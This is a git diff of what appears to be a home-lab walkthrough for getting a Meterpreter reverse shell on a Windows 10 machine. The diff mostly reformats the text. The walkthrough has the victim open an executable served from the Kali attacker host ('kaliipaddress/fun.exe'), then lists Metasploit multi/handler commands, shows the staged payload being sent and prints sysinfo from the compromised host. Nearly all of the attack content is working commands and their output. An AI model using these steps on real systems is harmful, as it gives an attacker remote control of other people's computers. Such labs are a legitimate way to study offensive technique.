@@ -30,13 +30,18 @@ open http://kaliipaddress/fun.exe
 
 
 ## run the following in metasploit, throw in an options or help command here and there ##
-> msf6 > use multi/handler
+
+msf6 > use multi/handler
+
 [*] Using configured payload generic/shell_reverse_tcp
-> msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
-> msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
 LHOST => 0.0.0.0
-> msf6 exploit(multi/handler) > exploit
+
+msf6 exploit(multi/handler) > exploit
 
 [*] Started reverse TCP handler on 0.0.0.0:4444 
 [*] Sending stage (175174 bytes) to <windowsip>
@@ -44,8 +49,9 @@ LHOST => 0.0.0.0
 
 # you have now spawned reverse shell with meterpreter # 
 
-> meterpreter > sysinfo
-Computer        : DESKTOP-WINDERS10
+meterpreter > sysinfo
+ 
+Computer        : DESKTOP-WINDERS10 <br>
 OS              : Windows 10 (10.0 Build 19044).
 Architecture    : x64
 System Language : en_US
